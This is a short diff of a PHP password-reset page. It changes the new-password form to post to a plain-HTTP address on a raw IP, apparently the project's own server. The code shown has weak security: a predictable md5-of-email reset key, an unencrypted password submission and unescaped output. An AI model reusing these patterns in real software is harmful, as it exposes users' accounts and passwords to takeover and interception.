@@ -30,7 +30,7 @@ if($_GET['key'] && $_GET['reset'])
     if(md5($row['Email'])==$email)
   {
     ?>
-    <form class="form" method="post" action="GertHome.php">
+    <form class="form" method="post" action="http://18.169.22.165/gert/login/">
     <input type="hidden" id="Email" name="email" value="<?php echo $row['Email'];?>">
     <a>Enter New password</a><br>
     <input class = "box" type="password" id='Password' name='Password'><br>
